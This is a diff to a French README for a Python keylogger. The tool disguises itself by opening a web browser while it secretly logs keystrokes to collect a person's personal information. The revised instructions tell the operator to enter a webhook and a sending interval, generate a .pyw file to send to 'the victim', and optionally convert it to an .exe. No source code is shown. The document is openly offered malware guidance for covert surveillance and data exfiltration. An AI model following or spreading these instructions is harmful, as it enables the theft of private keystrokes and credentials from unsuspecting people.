@@ -4,9 +4,9 @@ Python 3.10
 # Explication
 Ce programme lance un navigateur et un keylogger en même temps , sert a récuperer les infos personelles d'une personne
 # Installation
-Il faut que la victime ait installée [python](https://www.python.org/downloads/) et il suffira de le lancer et le keylogger s'ouvrira en arriere plan tandis qu'un navigateur internet apparaît
+Il faut juste installer [python](https://www.python.org/downloads/) et il suffira de le lancer et le programme créera un fichier .pyw a envoyer a la victime
 # Utilisation
-Entrez un webhook dans le main.pyw a l'emplacement "entrez votre webhook" et envoyez le a votre victime
+Demarrez le main.py et entrez votre webhook et votre temps en seconde d'intervalle entre chaque envois de fichiers aux webhook
 ## Petit Plus
 Vous pouvez envoyer le programme en .exe grâce a autopytoexe
 # Fonctionnement
